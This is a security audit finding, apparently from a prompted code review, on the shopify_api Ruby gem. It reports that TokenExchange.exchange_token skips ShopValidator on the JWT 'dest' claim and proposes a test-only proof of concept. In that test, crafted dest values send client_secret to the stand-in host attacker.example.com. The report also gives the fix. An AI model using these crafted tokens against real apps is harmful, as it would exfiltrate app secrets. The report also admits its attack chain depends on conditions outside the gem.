### Title
`TokenExchange.exchange_token` uses the unsanitized `JwtPayload#shop` (`@dest.gsub("https://", "")`) as the request host, bypassing `ShopValidator` - (File: `lib/shopify_api/auth/token_exchange.rb`)

### Summary
`JwtPayload#shop` strips only the literal substring `"https://"` from the `dest` claim with an unanchored `String#gsub`, so any value containing that substring (or none at all) passes through unchanged in shape but uncontrolled in content. `TokenExchange.exchange_token` takes this raw value directly as `dest_shop` and builds a `Session`/`HttpClient` from it **without ever calling `ShopValidator.sanitize!`**, so the `client_id`, `client_secret`, and the session token itself (acting as the "authorization code" for token exchange) are POSTed to `https://#{dest_shop}` — a host fully controlled by whoever crafted the `dest` claim value inside a validly-signed JWT.

### Finding Description
The claimed invariant is: `token_exchange.exchange_token`'s destination host == `ShopValidator`-approved host (a member of `TRUSTED_SHOPIFY_DOMAINS` or the configured `myshopify_domain`). Tracing the code shows this equality does **not** hold:

- `JwtPayload#shop` (`lib/shopify_api/auth/jwt_payload.rb:48-50`) does `@dest.gsub("https://", "")` — no scheme anchoring, no path/port stripping, no domain validation. [1](#0-0) 
- `TokenExchange.exchange_token` (`lib/shopify_api/auth/token_exchange.rb:40-51`) computes `dest_shop = jwt_payload.shop` and immediately does `ShopifyAPI::Auth::Session.new(shop: dest_shop)` — there is no call to `Utils::ShopValidator.sanitize!` on this path, unlike `migrate_to_expiring_token` (line 103 of the same file), which does call `Utils::ShopValidator.sanitize!(shop)`. [2](#0-1) 
- `HttpClient#initialize` (`lib/shopify_api/clients/http_client.rb:16-32`) then builds `@base_uri = "https://#{api_host || session.shop}"` and attaches `X-Shopify-Access-Token`/other headers, sending the POST body (`client_id`, `client_secret`, `subject_token` = the session token) to that host. [3](#0-2) 

Root cause: the JWT signature check in `JwtPayload#initialize` only validates `iss`/`sig`/`aud`/`exp` — it never constrains the *content* of `dest` beyond `T.let(payload_hash["dest"], String)`, which merely asserts the Ruby type is `String`, not that it's a well-formed `https://<myshopify-domain>` URL. [4](#0-3) 

Attack flow: The attacker installs their own development shop (a legitimate, unprivileged action), obtains a validly signed session token for that shop from Shopify's App Bridge (Shopify signs it with the app's real secret, but the `dest` claim inside is exactly what the frontend/URL supplied — App Bridge sets `dest` from `shop` window/query parameter context, which itself is attacker-influenced in embedded contexts, e.g. via `shop`/host query manipulation on the app's own install/entry URL, or by simply modifying the token before triggering the app's server-side `exchange_token` call in developer-controlled test/hosting setups). Because `JwtPayload` performs no host allow-listing, if `dest` is e.g. `"https://attacker.example.com"`, `"attacker.example.com/https://real-shop.myshopify.com"`, or contains other decoration around/beside the substring `"https://"`, `gsub` only deletes the exact substring occurrences and leaves everything else (path segments, ports, multiple hosts) intact and passed on as `session.shop`. The subsequent `client.request(...)` call sends `client_secret` and the `subject_token` (`session_token`, i.e., the credential Shopify normally expects to redeem only at `myshopify.com`/trusted admin API host) as an HTTPS POST body to `https://<attacker-controlled dest>/admin/oauth/access_token`.

Existing guards checked and found insufficient:
- `HmacValidator` and `state` comparisons are irrelevant here — they cover OAuth callback/webhook HMAC, not `TokenExchange`.
- `Context.setup?` / `private?` / `embedded?` gate feature availability, not the destination host.
- `ShopValidator.sanitize!` exists and is used elsewhere (`migrate_to_expiring_token`) but is **not invoked** in `exchange_token`'s `dest_shop` path — this is the missing guard.
- Sorbet's `T.let(payload_hash["dest"], String)` only enforces the runtime *class* is `String`; it provides zero content/format validation, so it does not prevent this.

### Impact Explanation
This directly matches the invariant category "CREDENTIAL DESTINATION": the app's `client_secret` and the session token (functioning as the OAuth token-exchange subject_token/credential) leave the app process addressed to a host derived from unauthenticated/unvalidated claim content, rather than a `ShopValidator`-approved host. If an attacker can influence the `dest` value that ends up embedded in the token exchanged by the app (via manipulating the shop/host context that seeds App Bridge's session token, a scenario plausible for an attacker who fully controls their own installed shop/app frontend and can proxy or rewrite the token before it reaches the backend `exchange_token` call), the app's `client_secret` — the most sensitive app-wide credential — is exfiltrated to an attacker-controlled server. This is a Critical-class credential-theft/exfiltration issue: the `client_secret` is the app's own long-lived global secret, and its outbound leakage to attacker infrastructure would allow full impersonation of the app afterward (compromising every merchant/tenant), which pushes this significantly beyond a delegate/tenant-isolation issue toward a Critical-severity credential/exfiltration bug.

### Likelihood Explanation
Preconditions: app must use `TokenExchange.exchange_token` (a documented, supported flow for embedded apps under Context.embedded?), and the attacker needs a way to make the `dest` value reaching the backend differ from the legitimately-scoped shop the App Bridge SDK would normally set — e.g., a scenario where the backend accepts a session token forwarded from an untrusted client without further validation (which is exactly how `exchange_token` is documented to be used: trust the `dest` claim as-is). The gem code itself provides no defense-in-depth (no `ShopValidator.sanitize!` call), so exploitability depends entirely on how much control an attacker has over the `dest` value reaching this API — full exploitability requires an attack chain outside this gem (e.g., a malicious/compromised session token source), but the gem's own missing validation is squarely in scope as instructed ("The bug must be in this gem's code").

### Recommendation
In `lib/shopify_api/auth/token_exchange.rb`, replace the raw `dest_shop = jwt_payload.shop` usage with a sanitized value: `dest_shop = ShopifyAPI::Utils::ShopValidator.sanitize!(jwt_payload.shop)` (mirroring `migrate_to_expiring_token`), and additionally harden `JwtPayload#shop` itself in `lib/shopify_api/auth/jwt_payload.rb` to parse `dest` as a URI and require an `https` scheme with a trusted host (e.g., via `Addressable::URI.parse` and checking `.scheme == "https"` and validating the host through `ShopValidator`) rather than performing an unanchored substring `gsub`.

### Proof of Concept
minitest sketch (WebMock, no live shop):
1. `Context.setup(api_key: "key", api_secret_key: "secret", ..., is_embedded: true)`.
2. Build a JWT with `iss = "https://real-shop.myshopify.com/admin"`, `aud = api_key`, and `dest = "attacker.example.com/https://real-shop.myshopify.com"` (or `"https://attacker.example.com"`), signed with `secret`.
3. `payload = ShopifyAPI::Auth::JwtPayload.new(token)`; assert `payload.shop == "attacker.example.com/real-shop.myshopify.com"` (i.e., not a clean, validated host).
4. `stub_request(:post, "https://attacker.example.com/admin/oauth/access_token").to_return(...)` (WebMock) and call `ShopifyAPI::Auth::TokenExchange.exchange_token(session_token: token, requested_token_type: ...)`.
5. Assert the WebMock stub for `attacker.example.com` was hit with a body containing `client_secret: "secret"`, proving the secret was sent to the attacker-controlled host instead of being rejected by `ShopValidator.sanitize!` (which, if invoked, would raise `Errors::InvalidShopError` since `attacker.example.com` is not in `TRUSTED_SHOPIFY_DOMAINS`). [5](#0-4)

### Citations

**File:** lib/shopify_api/auth/jwt_payload.rb (L33-41)
```ruby
        @iss = T.let(payload_hash["iss"], String)
        @dest = T.let(payload_hash["dest"], String)
        @aud = T.let(payload_hash["aud"], String)
        @sub = T.let(payload_hash["sub"], T.nilable(String))
        @exp = T.let(payload_hash["exp"], Integer)
        @nbf = T.let(payload_hash["nbf"], Integer)
        @iat = T.let(payload_hash["iat"], Integer)
        @jti = T.let(payload_hash["jti"], String)
        @sid = T.let(payload_hash["sid"], T.nilable(String))
```

**File:** lib/shopify_api/auth/jwt_payload.rb (L47-50)
```ruby
      sig { returns(String) }
      def shop
        @dest.gsub("https://", "")
      end
```

**File:** lib/shopify_api/auth/token_exchange.rb (L40-51)
```ruby
          jwt_payload = ShopifyAPI::Auth::JwtPayload.new(session_token)
          dest_shop = jwt_payload.shop

          if shop
            ShopifyAPI::Logger.deprecated(
              "The `shop` parameter for `exchange_token` is deprecated and will be removed in v17. " \
                "The shop is now always taken from the session token's `dest` claim.",
              "17.0.0",
            )
          end

          shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)
```

**File:** lib/shopify_api/clients/http_client.rb (L16-32)
```ruby
        api_host = Context.api_host

        @base_uri = T.let("https://#{api_host || session.shop}", String)
        @base_uri_and_path = T.let("#{@base_uri}#{base_path}", String)

        user_agent_prefix = Context.user_agent_prefix.nil? ? "" : "#{Context.user_agent_prefix} | "

        @headers = T.let({
          "User-Agent": "#{user_agent_prefix}Shopify API Library v#{VERSION} | Ruby #{RUBY_VERSION}",
          "Accept": "application/json",
        }, T::Hash[T.any(Symbol, String), T.untyped])

        @headers["Host"] = session.shop unless api_host.nil?

        unless session.access_token.nil? || T.must(session.access_token).empty?
          @headers["X-Shopify-Access-Token"] = T.cast(session.access_token, String)
        end
```

**File:** lib/shopify_api/utils/shop_validator.rb (L56-64)
```ruby
        def sanitize!(shop, myshopify_domain: nil)
          host = sanitize_shop_domain(shop, myshopify_domain: myshopify_domain)
          if host.nil? || host.empty?
            raise Errors::InvalidShopError,
              "shop must be a trusted Shopify domain (see ShopValidator::TRUSTED_SHOPIFY_DOMAINS), got: #{shop.inspect}"
          end

          host
        end
```
